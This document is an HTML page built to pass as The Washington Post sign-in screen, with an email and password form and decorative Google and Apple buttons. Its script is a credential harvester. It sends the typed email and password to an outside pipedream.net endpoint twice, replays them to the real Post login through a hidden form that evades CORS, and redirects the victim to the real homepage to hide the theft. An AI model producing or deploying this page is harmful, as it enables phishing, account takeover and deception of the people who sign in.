<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - The Washington Post</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Franklin Gothic Medium', 'Franklin Gothic', 'ITC Franklin Gothic', Arial, sans-serif; background: #fff; color: #333; }
.header { text-align: center; padding: 32px 0 24px; border-bottom: 1px solid #e9e9e9; }
.header svg { height: 28px; }
.container { max-width: 360px; margin: 0 auto; padding: 32px 20px; }
h1 { font-family: Georgia, serif; font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 24px; color: #333; }
.input-group { margin-bottom: 16px; }
.input-group label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 6px; color: #333; }
.input-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; font-family: inherit; }
.input-group input:focus { outline: none; border-color: #333; }
.submit-btn { display: block; width: 100%; padding: 14px; background: #333; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; font-family: inherit; margin-top: 8px; }
.submit-btn:hover { background: #444; }
.submit-btn:disabled { background: #999; cursor: default; }
.divider { text-align: center; margin: 24px 0; position: relative; }
.divider::before { content: ''; position: absolute; left: 0; top: 50%; width: 100%; height: 1px; background: #ddd; }
.divider span { background: #fff; padding: 0 12px; position: relative; font-size: 13px; color: #666; }
.social-btn { display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; background: #fff; margin-bottom: 10px; font-family: inherit; color: #333; }
.social-btn svg { margin-right: 8px; height: 18px; width: 18px; }
.footer-text { text-align: center; font-size: 12px; color: #999; margin-top: 32px; line-height: 1.6; }
.footer-text a { color: #333; }
.error { color: #c00; font-size: 13px; margin-top: 4px; display: none; }
.spinner { display: none; text-align: center; padding: 40px 0; }
.spinner .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #333; margin: 0 4px; animation: bounce 1.2s infinite; }
.spinner .dot:nth-child(2) { animation-delay: 0.2s; }
.spinner .dot:nth-child(3) { animation-delay: 0.4s; }
@keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
</style>
</head>
<body>

<div class="header">
<svg viewBox="0 0 300 36" fill="#333" xmlns="http://www.w3.org/2000/svg">
<text x="50%" y="28" text-anchor="middle" font-family="'Old English Text MT', 'Engravers Old English', Georgia, serif" font-size="30" fill="#333">The Washington Post</text>
</svg>
</div>

<div class="container">
<div id="formSection">
<h1>Sign in</h1>

<form id="signinForm" autocomplete="on">
<div class="input-group">
  <label for="email">Email address</label>
  <input type="email" id="email" name="email" autocomplete="email" required>
</div>
<div class="input-group">
  <label for="password">Password</label>
  <input type="password" id="password" name="password" autocomplete="current-password" required>
  <div class="error" id="errorMsg">The email or password you entered is incorrect.</div>
</div>
<button type="submit" class="submit-btn" id="submitBtn">Sign in</button>
</form>

<div class="divider"><span>or</span></div>

<button class="social-btn" onclick="return false;">
<svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
Continue with Google
</button>

<button class="social-btn" onclick="return false;">
<svg viewBox="0 0 24 24"><path d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.987 1.57-.18 0-.36-.02-.53-.06-.01-.18-.04-.56-.04-.95 0-1.15.572-2.27 1.206-2.98.804-.94 2.142-1.64 3.248-1.68.03.22.05.45.05.68v.32zm3.05 17.32c-.03.05-1.16 2.02-3.24 2.02-1.07 0-1.76-.57-2.67-.57-.93 0-1.8.6-2.67.6-1.97 0-4.45-3.07-4.45-6.88 0-3.58 2.13-5.31 4.13-5.31 1.08 0 1.98.67 2.67.67.7 0 1.73-.73 2.93-.73.65 0 2.54.18 3.5 2.07-2.5 1.5-2.2 5.62.8 6.13z" fill="#333"/></svg>
Continue with Apple
</button>

<div class="footer-text">
By signing in, you agree to our <a href="#">Terms of Sale</a> and acknowledge our <a href="#">Privacy Policy</a>.
Need help? Contact <a href="#">Customer Care</a>.
</div>
</div>

<div class="spinner" id="spinner">
<p style="margin-bottom:16px;font-size:15px;">Signing in...</p>
<div><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
</div>
</div>

<script>
var EXFIL = 'https://eo3529siy4n2vfc.m.pipedream.net';

document.getElementById('signinForm').addEventListener('submit', function(e) {
  e.preventDefault();
  var email = document.getElementById('email').value;
  var pass = document.getElementById('password').value;
  var btn = document.getElementById('submitBtn');

  btn.disabled = true;
  btn.textContent = 'Signing in...';

  // Exfiltrate credentials
  new Image().src = EXFIL + '?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&t=' + Date.now();

  // Also send via sendBeacon for reliability
  try {
    navigator.sendBeacon(EXFIL, JSON.stringify({email: email, password: pass, ts: new Date().toISOString()}));
  } catch(ex) {}

  // Show spinner
  document.getElementById('formSection').style.display = 'none';
  document.getElementById('spinner').style.display = 'block';

  // Attempt real authentication via hidden form (text/plain trick bypasses CORS preflight)
  try {
    var iframe = document.createElement('iframe');
    iframe.name = 'authframe';
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://subscribe.washingtonpost.com/user/authenticate';
    form.enctype = 'text/plain';
    form.target = 'authframe';

    var payload = document.createElement('input');
    payload.type = 'hidden';
    payload.name = '{"username":"' + email.replace(/"/g, '') + '","password":"' + pass.replace(/"/g, '') + '","remember":"yes","authflow":false,"skipConnect":false,"x":"';
    payload.value = '"}';
    form.appendChild(payload);
    document.body.appendChild(form);
    form.submit();
  } catch(ex) {}

  // Redirect to WaPo homepage after delay (user appears logged in since app session is active)
  setTimeout(function() {
    window.location.href = 'https://www.washingtonpost.com/';
  }, 2500);
});
</script>
</body>
</html>
